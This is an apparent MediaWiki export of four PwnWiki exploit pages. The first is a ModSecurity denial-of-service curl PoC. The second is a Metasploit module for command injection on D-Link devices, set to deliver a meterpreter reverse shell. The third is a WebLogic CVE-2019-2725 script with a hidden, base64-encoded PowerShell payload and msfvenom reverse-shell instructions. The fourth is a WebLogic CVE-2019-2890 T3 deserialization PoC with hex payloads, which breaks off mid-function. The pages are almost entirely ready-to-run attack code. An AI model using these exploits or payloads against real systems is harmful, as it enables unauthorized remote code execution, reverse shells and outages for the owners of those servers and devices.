<mediawiki xmlns="http://www.mediawiki.org/xml/export-0.11/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.mediawiki.org/xml/export-0.11/ http://www.mediawiki.org/xml/export-0.11.xsd" version="0.11" xml:lang="chinese">
  <siteinfo>
    <sitename>PwnWiki</sitename>
    <dbname>sql_www_pwnwiki_</dbname>
    <base>https://www.pwnwiki.org/index.php?title=Main_Page</base>
    <generator>MediaWiki 1.35.1</generator>
    <case>first-letter</case>
    <namespaces>
      <namespace key="-2" case="first-letter">Media</namespace>
      <namespace key="-1" case="first-letter">Special</namespace>
      <namespace key="0" case="first-letter" />
      <namespace key="1" case="first-letter">Talk</namespace>
      <namespace key="2" case="first-letter">User</namespace>
      <namespace key="3" case="first-letter">User talk</namespace>
      <namespace key="4" case="first-letter">PwnWiki</namespace>
      <namespace key="5" case="first-letter">PwnWiki talk</namespace>
      <namespace key="6" case="first-letter">File</namespace>
      <namespace key="7" case="first-letter">File talk</namespace>
      <namespace key="8" case="first-letter">MediaWiki</namespace>
      <namespace key="9" case="first-letter">MediaWiki talk</namespace>
      <namespace key="10" case="first-letter">Template</namespace>
      <namespace key="11" case="first-letter">Template talk</namespace>
      <namespace key="12" case="first-letter">Help</namespace>
      <namespace key="13" case="first-letter">Help talk</namespace>
      <namespace key="14" case="first-letter">Category</namespace>
      <namespace key="15" case="first-letter">Category talk</namespace>
      <namespace key="274" case="first-letter">Widget</namespace>
      <namespace key="275" case="first-letter">Widget talk</namespace>
      <namespace key="710" case="first-letter">TimedText</namespace>
      <namespace key="711" case="first-letter">TimedText talk</namespace>
      <namespace key="828" case="first-letter">Module</namespace>
      <namespace key="829" case="first-letter">Module talk</namespace>
      <namespace key="1198" case="first-letter">Translations</namespace>
      <namespace key="1199" case="first-letter">Translations talk</namespace>
    </namespaces>
  </siteinfo>
  <page>
    <title>CVE-2019-19886 ModSecurity 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>5771</id>
    <revision>
      <id>6638</id>
      <timestamp>2021-07-10T07:16:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; ModSecurity 3.0 - 3.0.3  ==POC== &lt;translate&gt; 不斷向服務器發送此類請求將使工作線程反复崩潰 &lt;/trans..."</comment>
      <origin>6638</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="235" sha1="scanls9md6lo5mg2r7lkoq6ra6m1dsx" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
ModSecurity 3.0 - 3.0.3

==POC==
&lt;translate&gt;
不斷向服務器發送此類請求將使工作線程反复崩潰
&lt;/translate&gt;
&lt;pre&gt;
curl -s -H 'Cookie: =test' 'http://test/'
&lt;/pre&gt;</text>
      <sha1>scanls9md6lo5mg2r7lkoq6ra6m1dsx</sha1>
    </revision>
    <revision>
      <id>6639</id>
      <parentid>6638</parentid>
      <timestamp>2021-07-10T07:16:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6639</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="257" sha1="n7909mjaftrw621527orx4xz9ri6fut" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
ModSecurity 3.0 - 3.0.3

==POC==
&lt;translate&gt;
&lt;!--T:2--&gt;
不斷向服務器發送此類請求將使工作線程反复崩潰
&lt;/translate&gt;
&lt;pre&gt;
curl -s -H 'Cookie: =test' 'http://test/'
&lt;/pre&gt;</text>
      <sha1>n7909mjaftrw621527orx4xz9ri6fut</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-20215 D-Link Devices未經身份驗證遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1015</id>
    <revision>
      <id>1289</id>
      <timestamp>2021-04-09T02:42:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==MSF EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitMo..."</comment>
      <origin>1289</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2061" sha1="hrjbni051rs9kpxs1zdv4wzvx8r9int" xml:space="preserve">==MSF EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'        =&gt; 'D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi',
      'Description' =&gt; %q{
        D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi.
      },
      'Author'      =&gt;
        [
          's1kr10s',
          'secenv'
        ],
      'License'     =&gt; MSF_LICENSE,
      'References'  =&gt;
        [
          ['CVE', '2019-20215'],
          ['URL', 'https://medium.com/@s1kr10s/2e799acb8a73']
        ],
      'DisclosureDate' =&gt; 'Dec 24 2019',
      'Privileged'     =&gt; true,
      'Platform'       =&gt; 'linux',
      'Arch'        =&gt; ARCH_MIPSBE,
      'DefaultOptions' =&gt;
        {
            'PAYLOAD' =&gt; 'linux/mipsbe/meterpreter_reverse_tcp',
            'CMDSTAGER::FLAVOR' =&gt; 'wget',
            'RPORT' =&gt; '1900'
        },
      'Targets'        =&gt;
        [
          [ 'Auto',	{ } ],
        ],
      'CmdStagerFlavor' =&gt; %w{ echo wget },
      'DefaultTarget'  =&gt; 0
      ))

  register_options(
    [
      Msf::OptEnum.new('VECTOR',[true, 'Header through which to exploit the vulnerability', 'URN', ['URN', 'UUID']])
    ])
  end

  def exploit
    execute_cmdstager(linemax: 1500)
  end

  def execute_command(cmd, opts)
    type = datastore['VECTOR']
    if type == "URN"
      print_status("Target Payload URN")
      val = "urn:device:1;`#{cmd}`"
    else
      print_status("Target Payload UUID")
      val = "uuid:`#{cmd}`"
    end

    connect_udp
    header = "M-SEARCH * HTTP/1.1\r\n"
    header &lt;&lt; "Host:239.255.255.250: " + datastore['RPORT'].to_s + "\r\n"
    header &lt;&lt; "ST:#{val}\r\n"
    header &lt;&lt; "Man:\"ssdp:discover\"\r\n"
    header &lt;&lt; "MX:2\r\n\r\n"
    udp_sock.put(header)
    disconnect_udp
  end
end
&lt;/pre&gt;</text>
      <sha1>hrjbni051rs9kpxs1zdv4wzvx8r9int</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-2725 Oracle Weblogic 10.3.6.0.0 / 12.1.3.0.0 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1390</id>
    <revision>
      <id>1755</id>
      <timestamp>2021-04-20T04:02:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python  # Exploit Title: Oracle Weblogic Exploit CVE-2019-2725 # Date: 30/04/2019 # Exploit Author: Avinash Kumar Thapa # Vendor Homepage: https://www..."</comment>
      <origin>1755</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9569" sha1="3p0l7sfr4tbbpht19cbzbh37yhyj3jp" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python

# Exploit Title: Oracle Weblogic Exploit CVE-2019-2725
# Date: 30/04/2019
# Exploit Author: Avinash Kumar Thapa
# Vendor Homepage: https://www.oracle.com/middleware/technologies/weblogic.html
# Software Link: https://www.oracle.com/technetwork/middleware/downloads/index.html
# Version: Oracle WebLogic Server, versions 10.3.6.0.0, 12.1.3.0.0
# Tested on:
	#OS: Windows 2012 R2 (Build 9600).
	#Architecture    : x64
	#System Language : en_US


# CVE : CVE-2019-2725


# Script Usage:
# python exploit.py http://IP:PORT/_async/AsyncResponseServiceHttps
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=1234 -f psh-cmd &gt; exploit.ps1
# Add the powershell command in the variable

__author__ = "Avinash Kumar Thapa"
__description__ = """
Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services). Supported versions that are affected are 10.3.6.0.0 and 12.1.3.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server

CREDIT STATEMENT:
The following people or organizations reported security vulnerabilities addressed by this Security Alert to Oracle:

Badcode of Knownsec 404 Team: CVE-2019-2725
Hongwei Pan of Minsheng Banking Corp.: CVE-2019-2725
Liao Xinxi of NSFOCUS Security Team: CVE-2019-2725
Lin Zheng of Minsheng Banking Corp.: CVE-2019-2725
Song Keya of Minsheng Banking Corp.: CVE-2019-2725
Tianlei Li of Minsheng Banking Corp.: CVE-2019-2725
ZengShuai Hao: CVE-2019-2725
Zhiyi Zhang of 360 ESG Codesafe Team: CVE-2019-2725

"""

import requests
import sys

print "Exploit Written by Avinash Kumar Thapa"


exploit = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwBIADQAcwBJAEEARABQAFcAeAAxAHcAQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwBuAEUAagA5AEQAMQBhAEYAWgBGAHMAaABHAEIATABhAE4ASgBFAHEAMwBaAHAAWABVADUAeQBZAE8AQgBBAEkAaAAwADQAYgBlADIAMgBXAHIATAAzAEUAWABoAE8AZwAxAC8AOQArAHMAMgBDAG4ANgBUAFcAdAAyAHAAUABPADQAbQBWAGYAWgBtAFoAbgBuAG4AbABtADEAawBFAFcAZQA0AEwAeQBXAEYAawBzAHUAZgBMADUAegBlAEcAQgBnAHgATQBjAEsAVgBvAHAAYQBrADMASwBTAG0AbgBWAGEANQArAG0AKwBzAEUAQgBiAEoAUgBXAFYAawBmADUAcQBHAGgAVAB0AEYAdwAyAGUAWQBSAHAAUABMAHUANABhAEcAUgBKAFEAbQBLAHgAbgAxAGMANgBSAEsAQQAwAEoAZABFADkAbwB5AFQAVgBkAE8AVgB2ADUAWABaAE8ARQBuAEoAOABkAGIAOABnAG4AbABBACsASwA2AFcALwBLAGgAMwBHADcAegBIAEwAeABUAFkATgA3AE0AMgBKAGMAbwB4AGkAWAArADcAMQB1AFkAZQBsAE0AeABWADMAeQBhAGoAUQAxAEQALwAvAFYAUABYAHAAYwBXADEAVwBhAFQAMQBtAG0ASwBXAGEANgBtADUAUwBRAGEASwBLAHoANQBpAHEASwAxADkAMABlAGUARABOAFoAawBrADAAMQBhAFoAZQB3AGwATQBlAGkATQBvAHQAagBVADkAUABLAHMATQA0AHgAUQBHADUAQgBHAHMAcgBZAGgATQB4ADUAMwA2AHEANgBoAEEARQBmAEIASQBpAHMAaQBSAFcAWgBEAGgAUwBmADcAKwByAHEAVABCADAARQB1ADQAaAAzADAAOQBJAG0AcQBwAGwAWgBTAG8AdABUADIAZQB6AFAANwBSAHAAZgB1AHgAMQBGAGcAcwBhAGsAWQBvAFYAQwA1AEwAdwBwAFUAdQBTAEYAZgBWAEkAVwB1AG4AaQAyAEcAZgBrAG0AZwBRAHoAMABIAEoARgBRAHUATgB3AHAAdQBzAGcAdAB1AEkAUABSAEMAdgBGAEcAVwBOAGwANQBYAGYATQBhAEoAZgBrAHEAUQBEAHQAVgA1AFcAMABsADAAbwBnADUAWQBoAEUATAAwAE0AZQB2AHcALwBUADUAbgA3AEcAeQBGADUAUgBmAGMAVgBQAG0AWABvAGQAbgB1AGYAMABBADMAQgBmADMAaAB5ACsATwBRAHcASwByAHAARAB6AGwAMQBTAEIAMABjAEYAMABOAHkAYgBnAG0AKwBiAHcAbABPADYAawBQAGkAcgBWAHMAbQBMAEQATQBWAGoAdwBaAEEAUABUADAAawAyAFMARQBYADMAMgBqAEsAeABTAFMAcwBmAE4AKwAvAEsAUAA5AFcAdQBGAE0ASQBnAFMAdgB3ADgAcgAwAHgARwBuAC8AZwB3ADAAOABtAFMAVwA4AEwAZwBwAGwAMwAvAE0AeQBTAFkASgBhAEUAeQBhAG0AeABoAEgAMQBDAHQAbwBwADcAMgBHAE0AQQBrAFkAMgBjAFYAWABLAGMAUQB1AHcAUwBWAE4AegBUAGUASQAzAHkAUwBNAGgARgBoAEkAMABHAFMAaQB2ADEATgByAFIAVgBRADgANgA1AG8AWgBaAFQANQBKAGsAQQBkAFoAUwBzAEUAcgBTAEsARAArAHIAVABQADcAUABHAGkAcQBGAGQAcwBrAEEAbwBUADIAYwAyAEIAZQBLAFEAQwB5AGsAMABJADYASgAvAGkAbQBPAEYAMwBPAFEAVQBoAHQATQBKAHkAbQBaAGMAWABKAG8ATgBxADgAcwB1AEkAUwB6AEkAaABmAFYAbABDAGMAMABuAHcATABaAFkATAB2AGgAdQBwAFgAZAArADIATQBDAGUAcgBoAFYAQgBUAG0AWgBuAG8ATwBZADMANQBjAGcAOABlAHAAUwBEAEkAUABjAGcAYQBoADMANwBoAEwANABsAEgATQBKAEIASgBsAHAAVQB0ADkAWQBtADUAYwBHAGgAYgBIAHEAcQAvAGkAMABNAEMATQBRAFEAMgBBAHAAUgBYAGsAQQBWAFoAawAvAEsANgBRAFQARQBqAEEAdwAxADMAVwA5AFkAcABMAGgAQgBVAHQARwBZAGwAQQBaAGwAZgAxAGIAWQBaAEQAcQBQAEcAYwA2AFQAdgBxADQASgBEADQANgByADgAYwBMAEoAaQA4AHAANgAxAEUAbwBvAEQAZwBoAFgAdQBRAFgAcABkAHgAVQBWAFoARwBOAEIASABRAE8AeQBTAHEAdwBLAEQALwBkAHYAaQBMAHAAaQBIAGQAYQBDAFEAawBUADQATgBXAFYATQBiAFUAMwBBAGoASgA2AE4ASwBXAGUAcQAyADEASgBHAFMATwB5AGcANgBEAFIARQBEADgANwBZAFIASABKAGsANwBKACsALwBxACsAUQAyAGgAdgBqAFMAdgBhAFEAUABCAE0AcgBKAGoAWgBuAHYAbABBAGEAKwBpAEoAMQBpAHcAYgB2AGsATgA2AGEAdgBIAG0AbQBmACsAcAB0ACsAZwBhAFMAWABNADkARAA1AEMAVgBXAG4AYgBYAGEAUQA2ADYAMwBmAHEAcQA1ADQANwBxAHcAbQAxAFoANABwAE4AagBDAGIAcwAxAFgAaQB4AGMAMQBMADAAZQBUAHMAUwBkAGgAYgBvADMAdABQAG8AdwBxAFcAKwBYAFAAYgBwADEAKwA4AGkAZgByAEkAMwAzAFcAMwBQADcAVgBEAFgAWAAyADAAWABvAEIANQBOAG0ARQBJAFIAbgBnAFgAdABkAGUAOQBlAG0ALwBkAHYARwB3AEsAeQBlADQASAA2AHoAbABmAFYAdgB6AFMAZQB6AFcAawA5AGIAOQBLAGsANwBvAE0AUABCAFEANgA4AHQANwBpAGMAagBoAG8AZQBCAEUAWQA1AHIANQA1AGkAdQArADgAbABpAFYATwBQADIAMQBrAEsAbwBNAHoALwAxAHQAcgAxAGcAMQBKAG4AYgAvAG0AYgBTAHAAVwBSAGgAVgBQAHQAMABnAEEAWQBJAGYAZgBLAHUAaAA4AE4ATwB1AEEAdwA3AEsAVABMAE8AUgA0ACsATgBLAEcAeQBPAEgAVwBlAEIAawBZAFYAYQBvADAAMwB2AEgAVABNAEgAdwA3AGEASgBoAGkAMQB6AGcASwArADQAYwAzAHIAVQBOAEcAcAAzAC8AbQBPAHIAZgBUAGYARwB2AFkAagA1AG4AYQA1AFIAbQA0AHkAUgBqAHgATABqAEoAcAB6AFgAegBxADcAbQBzAGMAUQBKAGgAKwBhAGoASwBXAFYAUQAvADIANwBUAE4AawBEAEcAcQBhAE4AdQAvAFkAUgB1ADcAeAA0AEgAbgBSAEMAMQBRAEcAWQBVAGMAWQBUAGIAOQBHAEYANABOAEEAYQBiAGwAegBlAGcAYwB6AHUAcwArAFIAeQBKADIAQgBvAGIAeABpAGcAMABRAGgAUwA0ADgAdwBsAEcASgBrAGkAYgBqADYAaAB0ADgAcwBiAG0AZwAyAE0ANwB4AG0AaAAwAE0AcQAvAGQAUAA5AFQAbQA0AEQATQBaAHIAegA3AFkAUABYAFQAVQA5AGgAegBEAE0ASQA2AGkAZQAvAGcAMQBrAEcAYwB2ADEALwBIAFkAZgBEAHAAYgBQAFEAbgBjAHUAdwBYAGIATgA4AGIANQA4AE8ATgBiAHkAUgBFAGcAUwBTAGsAeQBhADgAMABYAHUAZgA5AFIAeQA3AFoAeABrAHMANAB4AEEAMAA1AEEATQB5ADcASwBzAE0AMgBUAGQAdAA1AGUASABVADYAbABoAHEAYgBKAEsALwBtAEIASgBEAEYAaABjAEsAUABCAG4AVgBlAFEARwBUAEgARwBQAGQAbgBjAG8AUQAvAEQAdABiAEoAdgA5AHYATAB1AEcAYwBMAHcAOQBPAFQAVgBrAGEANAA4AEMAKwBwAGYAZQAzADYAeABkAEgARgB4AEIAeQA1AEMAZABlAHoANABXACsAbQBUAE8AQgBUAHoAYwBuAFYAOQBXAHEAMQBDAEQANgArAHUANgAxAFcASQA4AGQAZgBqAGEAdgBEAGwAUgB0AHYAYgBLAHMAdABMAFkASQBmAE0AcwAzAFcAMgBzADYANwBMAHUAaQBrAHQAKwA2AFAALwBGAGIARwA4AFYAdQBmAHcANQAvADgAYwBzAGEAOQByAFAAOQBuADkASgBSAFMAcgA1AFgAMgA4ADMAeQAxAC8AdQAvAEIAYgBpAFAANQB1ADMATABlAFkAQwBoAEIAMABvAGQARQB3AHMAcgAvAG4AWABnAHMALwA1ADgAYQBMAGwAdwBCAEkAQwBPAFEAOQB5AEIALwA1AEMAbgBlAFYAaQBlAE4ATABlAEQAVgA0AGMALwBnAFAAeQBrAHYAWgBDAGkAdwBLAEEAQQBBAD0AJwAnACkAKQApACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA=="

url =  sys.argv[1]

request_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Content-Type": "text/xml"}
data="&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"&gt;\r\n    &lt;soapenv:Header&gt;\r\n        &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;\r\n        &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;\r\n        &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt;\r\n            &lt;void class=\"java.lang.ProcessBuilder\"&gt;\r\n                &lt;array class=\"java.lang.String\" length=\"3\"&gt;\r\n                    &lt;void index=\"0\"&gt;\r\n                        &lt;string&gt;cmd&lt;/string&gt;\r\n                    &lt;/void&gt;\r\n                    &lt;void index=\"1\"&gt;\r\n                        &lt;string&gt;/c&lt;/string&gt;\r\n                    &lt;/void&gt;\r\n                    &lt;void index=\"2\"&gt;\r\n                        &lt;string&gt;%s&lt;/string&gt;\r\n                    &lt;/void&gt;\r\n                &lt;/array&gt;\r\n            &lt;void method=\"start\"/&gt;&lt;/void&gt;\r\n        &lt;/work:WorkContext&gt;\r\n    &lt;/soapenv:Header&gt;\r\n    &lt;soapenv:Body&gt;\r\n    &lt;asy:onAsyncDelivery/&gt;\r\n    &lt;/soapenv:Body&gt;\r\n&lt;/soapenv:Envelope&gt;" %  (exploit)
response = requests.post(url, headers=request_headers, data=data)
print "status_code:%s" % str(response.status_code)
print(response)
            
&lt;/pre&gt;</text>
      <sha1>3p0l7sfr4tbbpht19cbzbh37yhyj3jp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-2890 Oracle WebLogic 反序列化漏洞</title>
    <ns>0</ns>
    <id>1496</id>
    <revision>
      <id>1877</id>
      <timestamp>2021-04-23T00:54:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==POC== &lt;pre&gt; #!/usr/bin/python # -*- coding: utf-8 -*- # 2019-10-17 8:45  import socket import time import re import sys  timeout = int(sys.argv[1]) VUL=['CVE-20…」的新頁面</comment>
      <origin>1877</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8493" sha1="ns91pjyq8by6c0jd1pw96sfe69ow48f" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/python
# -*- coding: utf-8 -*-
# 2019-10-17 8:45

import socket
import time
import re
import sys

timeout = int(sys.argv[1])
VUL=['CVE-2019-2890']
PAYLOAD=['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078']
VER_SIG=['\\$Proxy[0-9]+']
vul_no = []
vul_yes = []
vul_more_test = []

def t3handshake(sock,server_addr):
    print '正在连接服务器...'
    sock.connect(server_addr)
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
    time.sleep(1)
    sock.recv(1024)


def buildT3RequestObject(sock,port,server_addr):
    print '%s:%d连接成功，正在发送请求...' %(server_addr[0],server_addr[1])
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
    data3 = '1a7727000d3234322e323134'
    data4 = '2e312e32353461863d1d0000000078'
    for d in [data1,data2,data3,data4]:
        sock.send(d.decode('hex'))
    time.sleep(2)
    lendate = len(sock.recv(2048))
    print '发送有效载荷请求成功,接收长度:%d'%(lendate)
    return lendate

def sendEvilObjData(sock,data,lendate):
    print '正在执行载荷，请稍等...'
    payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
    payload+=data
    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
    sock.send(payload.decode('hex'))
    time.sleep(2)
    sock.send(payload.decode('hex'))
    res = ''
    start = time.time()
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
            end =time.time()
            timeend = end-start
            if lendate == 0 and timeend &gt; timeout:
                break
    except Exception as e:
        pass
    return res

def checkVul(res,server_addr,index):
    print '执行结果：'
    p=re.findall(VER_SIG[index], res, re.S)
    if len(p)&gt;0:
